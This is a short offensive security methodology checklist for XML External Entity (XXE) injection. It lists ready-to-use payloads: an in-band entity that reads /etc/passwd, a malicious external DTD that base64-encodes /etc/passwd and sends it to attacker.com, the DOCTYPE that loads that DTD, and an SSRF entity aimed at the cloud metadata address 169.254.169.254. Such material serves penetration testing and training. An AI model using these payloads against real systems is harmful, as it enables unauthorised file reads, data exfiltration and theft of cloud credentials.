---
title: "XML External Entity (XXE)"
tags: [methodology, xxe]
summary: "XXE injection for file read, SSRF, and blind OOB exfiltration — in-band entity reflection, external DTD hosting, and PHP filter wrappers."
draft: false
---

## 1. Discovery
- [ ] Identify endpoints that accept XML data (APIs, SOAP services, SVG image uploads, document uploads).
- [ ] If the endpoint accepts JSON, change the `Content-Type` to `application/xml` or `text/xml` and send XML to see if it parses it.

## 2. Exploitation (In-Band)
- [ ] Define an external entity in the DOCTYPE.
  ```xml
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```
- [ ] Ensure the entity (`&xxe;`) is reflected in the response.

## 3. Exploitation (Out-of-Band / Blind)
- [ ] If the application parses XML but doesn't return the output, use OOB XXE to exfiltrate data to an attacker server.
- [ ] Host a malicious DTD (`evil.dtd`) on your server:
  ```xml
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfiltrate;
  ```
- [ ] Point the target to your DTD: `<!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>`

## 4. Escalation
- [ ] SSRF via XXE: Point the entity to internal network services (`http://169.254.169.254/latest/meta-data/`).
